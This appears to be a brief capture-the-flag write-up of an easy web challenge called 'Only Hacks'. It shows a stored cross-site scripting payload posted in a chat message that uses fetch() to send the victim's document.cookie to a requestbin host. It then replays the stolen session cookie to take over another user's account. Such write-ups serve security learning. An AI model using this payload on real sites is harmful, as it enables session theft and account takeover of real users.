# Only Hacks
### Difficulty Easy

- I don't know if this is hard to explain clearly, it's like a web chat and when I try the script in the message it works
- Then I checked the session cookies and tried to decode it at `https://www.jwt.io/` and the result is like this
```
{

  "user": {

    "id": 5,

    "username": "santstyle"

  }

}
``` 
- I think we need to modify this session cookies
- After that I tried to use `https://requestbin.whapi.cloud`
- And I tried to send this script to the message
```js
<script>fetch("http://requestbin.whapi.cloud/15ysmaj1?cookie=" + document.cookie);</script>
```
#### note: `15ysmaj1` is different for each user depending on your request bin, just copy it
- After sending, restart the requestbin page

`We should be able to get the cookies here, for example like this
```
cookie: session=eyJ1c2VyIjp7ImlkIjoxLCJ1c2VybmFtZSI6IlJlbmF0YSJ9fQ.aZA9Yw.xyYZ5no1Lwb1aXSW98-aJv2XXuM
```
- We copy the cookies and paste it in the `Cookies Value` earlier in the inspect element of the target page
- And click on Renata's profile and boom we get access to Renata's account.
